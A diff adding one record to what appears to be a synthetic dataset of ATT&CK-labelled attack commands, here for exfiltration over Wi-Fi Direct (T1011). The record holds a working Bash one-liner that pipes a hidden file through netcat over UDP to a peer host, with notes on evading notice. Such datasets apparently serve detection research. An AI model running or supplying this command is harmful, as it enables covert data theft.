@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i p2p-wlp2s0-0 -nn udp port 55303 -U -w /dev/null >/dev/null 2>&1 & dd if=/var/tmp/.sdata bs=64k 2>/dev/null | nc -u -s 192.168.49.1 192.168.49.2 55303",
+  "explanation": "Streams a data file over Wi\u2011Fi Direct (p2p interface) using UDP on an uncommon port while silently monitoring that port. This is exfiltration over an alternate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Use the Wi\u2011Fi Direct interface to bypass the primary WLAN.",
+    "Send via UDP on port 55303 to avoid standard services.",
+    "Run tcpdump scoped to the p2p interface and port, discarding output.",
+    "Pipe dd output into nc, binding to the P2P source IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-370f7eb0",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
